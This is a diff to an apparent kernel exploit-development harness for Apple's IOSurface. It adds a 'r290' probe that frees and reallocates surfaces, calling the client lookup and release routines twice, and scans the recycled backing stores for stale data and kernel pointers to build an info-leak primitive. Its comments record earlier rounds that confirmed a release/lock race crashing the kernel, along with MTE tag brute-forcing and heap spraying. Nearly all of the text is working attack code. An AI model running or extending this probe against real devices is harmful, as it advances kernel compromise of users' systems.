@@ -2424,6 +2424,260 @@ static void r289_probe(void) {
     fflush(stdout);
 }
 
+/* r290: Backing store reuse info leak and kernel pointer leak.
+ * r289 CONFIRMED: GetSeed/Width/AllocSize/UseCount are userspace-cached.
+ * No kernel call → no race possible with these accessors.
+ *
+ * NEW APPROACH: IOSurface backing stores are mapped into userspace via Lock.
+ * The userspace mapping is NOT MTE-tagged (MTE is kernel-only).
+ * If the kernel doesn't zero backing stores on reallocation:
+ *   1. Create surface A, lock, write pattern, unlock
+ *   2. Free surface A
+ *   3. Create surface B (same size), lock, read backing store
+ *   4. If stale data remains → info leak primitive
+ *
+ * Also test: create many surfaces, free them, then create a surface with
+ * a large allocation that might overlap the zone where IOSurface kernel
+ * metadata was stored. If the backing store overlaps freed metadata zones,
+ * we could read kernel pointers from the backing store.
+ *
+ * r274 tested purgeable memory (kernel zeros pages). But IOSurface backing
+ * stores use IOSurfaceAllocSize → different allocation path.
+ */
+static void r290_probe(void) {
+    rlog("\n=== r290: Backing Store Reuse Info Leak ===\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    /* Part 1: Backing store data persistence across free+realloc */
+    rlog("\n--- Part 1: Backing store data persistence ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 5; trial++) {
+        int sz = 64;
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int bpe=4,bpr=sz*4,pf=0x42475241,as=sz*sz*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&sz);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        /* Write pattern to backing store */
+        IOSurfaceLock(victim, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(victim);
+        uint32_t *pixels = (uint32_t *)base;
+        uint32_t pattern = 0xDEAD0000 + trial;
+        for (int i = 0; i < (as/4); i++) pixels[i] = pattern;
+        IOSurfaceUnlock(victim, 0, NULL);
+
+        /* Free */
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+
+        /* Reallocate same size */
+        IOSurfaceRef newsurf = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t newID = IOSurfaceGetID(newsurf);
+
+        IOSurfaceLock(newsurf, 0, NULL);
+        void *newbase = IOSurfaceGetBaseAddress(newsurf);
+        uint32_t *newpix = (uint32_t *)newbase;
+
+        /* Check first 16 dwords */
+        int stale_count = 0;
+        int zero_count = 0;
+        int other_count = 0;
+        for (int i = 0; i < 16; i++) {
+            if (newpix[i] == pattern) stale_count++;
+            else if (newpix[i] == 0) zero_count++;
+            else other_count++;
+        }
+        rlog("  [%d] old_id=%u new_id=%u pattern=0x%x first16: stale=%d zero=%d other=%d\n",
+            trial, victimID, newID, pattern, stale_count, zero_count, other_count);
+
+        /* Show first 8 dwords if any are non-zero */
+        if (stale_count > 0 || other_count > 0) {
+            rlog("    dwords: ");
+            for (int i = 0; i < 8; i++) rlog("0x%08x ", newpix[i]);
+            rlog("\n");
+        }
+
+        IOSurfaceUnlock(newsurf, 0, NULL);
+        CFRelease(newsurf);
+    }
+
+    /* Part 2: Scan newly created surface for non-zero data (kernel leaks) */
+    rlog("\n--- Part 2: Fresh surface scan for kernel data ---\n");
+    fflush(stdout);
+    {
+        /* Create and free many surfaces to churn the allocator */
+        IOSurfaceRef churn[100];
+        uint32_t churnIDs[100];
+        for (int i = 0; i < 100; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=32,h=32,bpe=4,bpr=32*4,pf=0x42475241,as=32*32*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+            churn[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+            churnIDs[i] = churn[i] ? IOSurfaceGetID(churn[i]) : 0;
+            if (churn[i]) {
+                IOSurfaceLock(churn[i], 0, NULL);
+                void *b = IOSurfaceGetBaseAddress(churn[i]);
+                memset(b, 0xAB, 32*32*4);
+                IOSurfaceUnlock(churn[i], 0, NULL);
+            }
+        }
+        rlog("  created+filled 100 surfaces\n");
+
+        /* Free all */
+        for (int i = 0; i < 100; i++) {
+            if (churn[i]) {
+                IOSurfaceClientRef cl1 = clLookup(churnIDs[i]);
+                IOSurfaceClientRef cl2 = clLookup(churnIDs[i]);
+                CFRelease(churn[i]);
+                clRelease(cl1);
+                clRelease(cl2);
+            }
+        }
+        rlog("  freed all 100\n");
+
+        /* Create fresh surfaces and scan for stale data */
+        int found_stale = 0;
+        int found_nonzero = 0;
+        for (int i = 0; i < 20; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=32,h=32,bpe=4,bpr=32*4,pf=0x42475241,as=32*32*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (!s) continue;
+            IOSurfaceLock(s, 0, NULL);
+            uint32_t *px = (uint32_t *)IOSurfaceGetBaseAddress(s);
+            int nz = 0, stale = 0;
+            for (int j = 0; j < (32*32); j++) {
+                if (px[j] != 0) nz++;
+                if (px[j] == 0xABABABAB) stale++;
+            }
+            if (nz > 0) {
+                found_nonzero++;
+                rlog("  scan[%d] id=%u nonzero=%d stale_AB=%d first4: 0x%08x 0x%08x 0x%08x 0x%08x\n",
+                    i, IOSurfaceGetID(s), nz, stale, px[0], px[1], px[2], px[3]);
+
+                /* Look for kernel-looking pointers */
+                uint64_t *px64 = (uint64_t *)px;
+                for (int j = 0; j < 16; j++) {
+                    if ((px64[j] & 0xFFFFF00000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (px64[j] & 0xFFFFF00000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        rlog("    KPTR? offset=%d val=0x%016llx\n", j*8, px64[j]);
+                    }
+                }
+            }
+            if (stale > 0) found_stale++;
+            IOSurfaceUnlock(s, 0, NULL);
+            CFRelease(s);
+        }
+        rlog("  scanned 20: nonzero=%d stale_AB=%d\n", found_nonzero, found_stale);
+    }
+
+    /* Part 3: Different alloc sizes to probe zone boundaries */
+    rlog("\n--- Part 3: Cross-size allocation scan ---\n");
+    fflush(stdout);
+    {
+        int sizes[] = {4096, 8192, 16384, 32768, 65536};
+        for (int si = 0; si < 5; si++) {
+            int as = sizes[si];
+            int w = 32, h = as / (32*4), bpe = 4, bpr = 32*4, pf = 0x42475241;
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn2=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn2);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn2);CFRelease(pfn);CFRelease(asn);
+
+            IOSurfaceRef s = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (!s) { rlog("  alloc=%d FAIL\n", as); continue; }
+
+            IOSurfaceLock(s, 0, NULL);
+            uint64_t *px64 = (uint64_t *)IOSurfaceGetBaseAddress(s);
+            int nz64 = 0;
+            int kptr_count = 0;
+            for (int j = 0; j < as/8; j++) {
+                if (px64[j] != 0) nz64++;
+                if ((px64[j] & 0xFFFFF00000000000ULL) == 0xFFFFFE0000000000ULL) kptr_count++;
+            }
+            rlog("  alloc=%d id=%u nonzero64=%d kptr=%d", as, IOSurfaceGetID(s), nz64, kptr_count);
+            if (nz64 > 0) {
+                rlog(" first4: 0x%016llx 0x%016llx 0x%016llx 0x%016llx",
+                    px64[0], px64[1], px64[2], px64[3]);
+            }
+            rlog("\n");
+            IOSurfaceUnlock(s, 0, NULL);
+            CFRelease(s);
+        }
+    }
+
+    rlog("\n*** r290 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -27672,6 +27926,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 290) {
+            rlog("*** rounds=290: Backing Store Reuse Info Leak ***\n");
+            rlog("  r289 CONFIRMED: Framework accessors are userspace-cached.\n");
+            rlog("  Testing: backing store data persistence, fresh surface scan.\n\n");
+            fflush(stdout);
+            r290_probe();
             goto done;
         }
         if (rounds == 289) {
